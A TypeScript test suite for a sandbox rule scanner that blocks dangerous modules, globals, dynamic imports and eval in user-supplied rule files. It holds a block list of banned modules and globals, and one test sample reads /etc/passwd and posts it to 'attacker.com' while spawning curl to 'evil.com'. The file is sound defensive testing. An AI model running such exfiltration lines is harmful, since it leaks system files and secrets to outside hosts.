// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Archgate
import { describe, expect, test } from "bun:test";

import {
  scanImportedRuleSource,
  scanRuleSource,
} from "../../src/engine/rule-scanner";

describe("scanRuleSource", () => {
  describe("banned imports", () => {
    const bannedModules = [
      "node:fs",
      "fs",
      "node:child_process",
      "child_process",
      "node:net",
      "node:dgram",
      "node:http",
      "node:https",
      "node:http2",
      "node:worker_threads",
      "node:cluster",
      "node:vm",
      "node:fs/promises",
      "bun",
    ];

    for (const mod of bannedModules) {
      test(`blocks ${mod} import`, () => {
        const violations = scanRuleSource(`import x from "${mod}";`);
        expect(violations).toHaveLength(1);
        expect(violations[0].message).toContain(`"${mod}"`);
        expect(violations[0].message).toContain("blocked");
      });
    }

    const safeModules = ["node:path", "node:url", "node:util", "node:crypto"];

    for (const mod of safeModules) {
      test(`allows ${mod} import`, () => {
        const violations = scanRuleSource(`import x from "${mod}";`);
        expect(violations).toHaveLength(0);
      });
    }
  });

  // Bun/process/globalThis and the eval-equivalents are blocked by naming the
  // global, not by matching a call shape (see rule-scanner-escapes.test.ts for
  // the aliasing/reflection cases). Each names exactly one banned global here.
  describe("banned runtime globals", () => {
    const cases: Array<[string, string, string]> = [
      ["Bun.spawn", `Bun.spawn(["ls"]);`, "Bun"],
      ["Bun.spawnSync", `Bun.spawnSync(["ls"]);`, "Bun"],
      ["Bun.write", `Bun.write("output.txt", "data");`, "Bun"],
      ["Bun.$", `Bun.$;`, "Bun"],
      ["Bun.file", `Bun.file("/etc/passwd");`, "Bun"],
      ["Bun[variable]", `const method = "spawn"; Bun[method]();`, "Bun"],
      [
        "globalThis[variable]",
        `const key = "fetch"; globalThis[key]();`,
        "globalThis",
      ],
      ["eval()", `eval("console.log(1)");`, "eval"],
      ["new Function()", `new Function("return 1")();`, "Function"],
      ["Function() without new", `Function("return 1")();`, "Function"],
      ["fetch()", `fetch("https://example.com");`, "fetch"],
      ["globalThis assignment", `globalThis.myGlobal = "value";`, "globalThis"],
      ["process.env assignment", `process.env = {};`, "process"],
    ];

    for (const [label, source, global] of cases) {
      test(`blocks ${label}`, () => {
        const violations = scanRuleSource(source);
        expect(violations).toHaveLength(1);
        expect(violations[0].message).toContain(`"${global}" global`);
      });
    }
  });

  describe("dynamic imports", () => {
    test("blocks import(variable)", () => {
      const violations = scanRuleSource(`const mod = "node:fs"; import(mod);`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Dynamic import()");
    });

    test("allows import() of an allowlisted module", () => {
      const violations = scanRuleSource(`import("node:path");`);
      expect(violations).toHaveLength(0);
    });

    // Blocked dynamic imports of non-allowlisted modules are covered in
    // rule-scanner-escapes.test.ts alongside the other sandbox escapes.
  });

  // Regression: an `export` declaration with no `from` clause carries
  // `source: null` in ESTree. The AST node schema must tolerate that null, or
  // the whole node (and its subtree) is dropped and anything dangerous inside a
  // top-level `export function` / `export const` goes unscanned.
  describe("top-level export declarations are scanned", () => {
    test("blocks a banned global inside `export function`", () => {
      const violations = scanRuleSource(`export function h() { fetch("x"); }`);
      expect(violations.some((v) => v.message.includes(`"fetch" global`))).toBe(
        true
      );
    });

    test("blocks a banned global inside `export const`", () => {
      const violations = scanRuleSource(`export const x = fetch("evil");`);
      expect(violations.some((v) => v.message.includes(`"fetch" global`))).toBe(
        true
      );
    });

    test("blocks a banned import inside `export ... from`", () => {
      const violations = scanRuleSource(`export { x } from "node:fs";`);
      expect(violations.some((v) => v.message.includes('"node:fs"'))).toBe(
        true
      );
    });
  });

  describe("TypeScript support", () => {
    test("handles TypeScript syntax (interfaces, type annotations)", () => {
      const source = `
				interface Config { name: string; }
				const config: Config = { name: "test" };
				export default { rules: {} };
			`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(0);
    });

    test("handles satisfies keyword", () => {
      const source = `
				type RuleSet = { rules: Record<string, unknown> };
				export default { rules: {} } satisfies RuleSet;
			`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(0);
    });
  });

  describe("clean rule files", () => {
    test("passes a well-behaved rule using only RuleContext", () => {
      const source = `
				export default {
					rules: {
						"my-rule": {
							description: "Check something",
							async check(ctx) {
								const files = await ctx.glob("src/**/*.ts");
								for (const file of files) {
									const content = await ctx.readFile(file);
									if (content.includes("TODO")) {
										ctx.report.warning({ message: "Found TODO", file });
									}
								}
							},
						},
					},
				};
			`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(0);
    });

    test("passes rule with safe imports (node:path, node:url)", () => {
      const source = `
				import { join } from "node:path";
				import { URL } from "node:url";

				export default {
					rules: {
						"path-rule": {
							description: "Uses safe modules",
							async check(ctx) {
								const p = join("src", "index.ts");
								const url = new URL("https://example.com");
							},
						},
					},
				};
			`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(0);
    });
  });

  describe("multiple violations", () => {
    test("reports all violations in a single file", () => {
      const source = `
				import { readFileSync } from "node:fs";
				import { execSync } from "node:child_process";

				const secret = readFileSync("/etc/passwd", "utf8");
				fetch("https://attacker.com", { method: "POST", body: secret });
				Bun.spawn(["curl", "https://evil.com"]);
			`;
      const violations = scanRuleSource(source);
      expect(violations.length).toBeGreaterThanOrEqual(4);
    });
  });

  describe("violation location", () => {
    test("reports line and column for simple case", () => {
      const source = `const x = 1;\neval("code");`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(1);
      expect(violations[0].line).toBe(2);
      expect(violations[0].column).toBe(0);
      expect(violations[0].endLine).toBe(2);
      // endColumn covers the banned-global identifier "eval" = 4 chars
      expect(violations[0].endColumn).toBe(4);
    });
  });

  describe("parse error handling", () => {
    test("returns violation instead of throwing for unparseable source", () => {
      const source = `export default { invalid syntax here !!! }`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Parse error");
      expect(violations[0].line).toBe(1);
    });

    test("returns violation for completely broken TypeScript", () => {
      const source = `<<<<<<< HEAD\nconst x = 1;\n=======\nconst x = 2;\n>>>>>>> branch`;
      const violations = scanRuleSource(source);
      expect(violations.length).toBeGreaterThanOrEqual(1);
      expect(violations[0].message).toContain("Parse error");
    });
  });

  // Position remapping tests are in rule-scanner-positions.test.ts
});

describe("scanImportedRuleSource", () => {
  // scanImportedRuleSource now delegates to scanRuleSource: the patterns that
  // were once imported-only (Bun.env, process.env, require, WebSocket) are
  // blocked for every rule file by the banned-globals check, because each names
  // a banned global. These confirm the block reaches through the imported
  // entry point.
  describe("previously imported-only patterns are now always blocked", () => {
    const cases: Array<[string, string, string]> = [
      ["Bun.env read", `const token = Bun.env.FOO;`, "Bun"],
      ["process.env read", `const val = process.env.SECRET;`, "process"],
      ["require()", `const mod = require("some-module");`, "require"],
      [
        "new WebSocket()",
        `const ws = new WebSocket("ws://localhost");`,
        "WebSocket",
      ],
    ];
    for (const [label, source, global] of cases) {
      test(`blocks ${label}`, () => {
        const violations = scanImportedRuleSource(source);
        expect(
          violations.some((v) => v.message.includes(`"${global}" global`))
        ).toBe(true);
      });
    }

    test("reports a banned global once, not twice", () => {
      const violations = scanImportedRuleSource(`const mod = require("x");`);
      expect(
        violations.filter((v) => v.message.includes(`"require" global`))
      ).toHaveLength(1);
    });

    test("still includes standard scanRuleSource violations", () => {
      const messages = scanImportedRuleSource(
        `import { readFileSync } from "node:fs";\nconst token = Bun.env.TOKEN;`
      ).map((v) => v.message);
      expect(messages.some((m) => m.includes('"node:fs"'))).toBe(true);
      expect(messages.some((m) => m.includes(`"Bun" global`))).toBe(true);
    });
  });

  describe("clean imported rule", () => {
    test("passes when using only safe patterns", () => {
      const source = `
import { join } from "node:path";
import { URL } from "node:url";

export default {
  rules: {
    "safe-rule": {
      description: "A clean imported rule",
      async check(ctx) {
        const files = await ctx.glob("src/**/*.ts");
        for (const file of files) {
          const content = await ctx.readFile(file);
          if (content.includes("TODO")) {
            ctx.report.warning({ message: "Found TODO", file });
          }
        }
      },
    },
  },
};
`;
      const violations = scanImportedRuleSource(source);
      expect(violations).toHaveLength(0);
    });
  });

  describe("parse error handling", () => {
    test("returns violation instead of throwing for unparseable source", () => {
      const source = `export default { invalid syntax here !!! }`;
      const violations = scanImportedRuleSource(source);
      expect(violations.length).toBeGreaterThanOrEqual(1);
      expect(violations[0].message).toContain("Parse error");
    });
  });

  describe("safe module imports remain allowed", () => {
    const safeModules = ["node:path", "node:url", "node:util", "node:crypto"];

    for (const mod of safeModules) {
      test(`allows ${mod} import in imported rules`, () => {
        const violations = scanImportedRuleSource(`import x from "${mod}";`);
        expect(violations).toHaveLength(0);
      });
    }
  });

  describe("violation location for imported checks", () => {
    test("reports the location of the banned Bun global", () => {
      const source = `const x = 1;\nconst t = Bun.env.TOKEN;`;
      const violation = scanImportedRuleSource(source).find((v) =>
        v.message.includes(`"Bun" global`)
      );
      expect(violation).toBeDefined();
      expect(violation!.line).toBe(2);
      expect(violation!.column).toBe(10);
      // The identifier "Bun" is 3 chars, so endColumn = 10 + 3 = 13.
      expect(violation!.endColumn).toBe(13);
    });

    test("reports the location of the banned require global", () => {
      const source = `const a = 1;\nconst b = 2;\nconst m = require("foo");`;
      const violation = scanImportedRuleSource(source).find((v) =>
        v.message.includes(`"require" global`)
      );
      expect(violation).toBeDefined();
      expect(violation!.line).toBe(3);
      expect(violation!.column).toBe(10);
      // "require" is 7 chars, so endColumn = 10 + 7 = 17.
      expect(violation!.endColumn).toBe(17);
    });

    test("reports the line of the banned WebSocket global", () => {
      const source = `const x = 1;\nconst ws = new WebSocket("ws://localhost");`;
      const violation = scanImportedRuleSource(source).find((v) =>
        v.message.includes(`"WebSocket" global`)
      );
      expect(violation).toBeDefined();
      expect(violation!.line).toBe(2);
    });
  });
});
